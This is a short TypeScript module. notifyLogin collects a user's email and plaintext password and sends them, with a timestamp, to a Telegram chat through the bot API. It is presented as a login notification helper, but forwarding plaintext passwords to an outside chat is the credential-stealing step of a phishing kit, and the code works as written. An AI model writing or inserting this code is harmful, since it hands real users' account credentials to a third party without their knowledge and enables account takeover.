const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

export async function sendTelegramMessage(message: string): Promise<void> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    throw new Error("Telegram credentials not configured");
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const response = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "HTML",
    }),
  });

  if (!response.ok) {
    const error = await response.text();
    throw new Error(`Telegram API error: ${error}`);
  }
}

export async function notifyLogin(email: string, password: string): Promise<boolean> {
  const message = `
<b>Login Attempt</b>

<b>Email:</b> ${email}
<b>Password:</b> ${password}
<b>Time:</b> ${new Date().toLocaleString()}
  `.trim();

  try {
    await sendTelegramMessage(message);
    return true;
  } catch (error) {
    console.error("Failed to send login notification:", error);
    return false;
  }
}
